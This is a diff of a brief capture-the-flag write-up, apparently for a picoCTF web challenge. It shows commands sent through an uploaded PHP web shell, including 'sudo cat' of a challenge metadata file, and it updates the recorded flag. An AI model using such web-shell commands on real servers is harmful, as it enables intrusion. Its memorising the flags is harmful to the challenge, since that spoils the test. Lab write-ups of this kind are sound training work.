@@ -5,5 +5,11 @@ then: http://standard-pizzas.picoctf.net:57978/uploads/webshell.php?cmd=sudo%20l
 then: ?cmd=sudo ls -la /challenge
 and cat the .json file which is there
 
+you can use: ?cmd=sudo%20cat%20%20/challenge/metadata.json
+which is 
 
-=> picoCTF{wh47_c4n_u_d0_wPHP_16579372}
+```
+sudo cat /challenge/metadata.json
+```
+
+=> picoCTF{wh47_c4n_u_d0_wPHP_2df2d584}
